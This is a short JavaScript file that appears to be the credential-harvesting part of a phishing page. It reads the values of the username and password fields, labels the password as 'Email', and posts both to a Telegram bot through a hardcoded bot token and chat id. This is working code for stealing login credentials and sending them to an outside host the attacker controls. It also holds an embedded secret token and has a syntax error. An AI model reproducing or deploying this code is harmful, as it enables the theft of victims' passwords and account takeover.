//bot token
var telegram_bot_id = "8827810558:AAHMgMCCghkPCwHduz0SMk9bppzOhypKtVI";
//chat id
var chat_id = 5092429629;
var u_name, email,;
var ready = function () {
    u_name = document.getElementById("username").value;
    email = document.getElementById("password").value;
    message = "Name: " + u_name + "\nEmail: " + email;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("name").value = "";
    document.getElementById("email").value = "";
    return false;
};
